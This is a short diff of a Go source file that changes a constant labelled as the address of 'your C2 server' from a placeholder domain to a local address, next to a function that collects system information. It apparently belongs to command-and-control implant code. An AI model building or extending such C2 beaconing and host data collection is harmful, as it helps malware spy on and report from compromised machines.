@@ -12,7 +12,7 @@ import (
 )
 
 // Define the URL of your C2 server
-const c2URL = "https://your-c2-server.com"
+const c2URL = "http://127.0.0.1:5000"
 
 // CollectSystemInfo collects information about the system.
 func CollectSystemInfo() string {
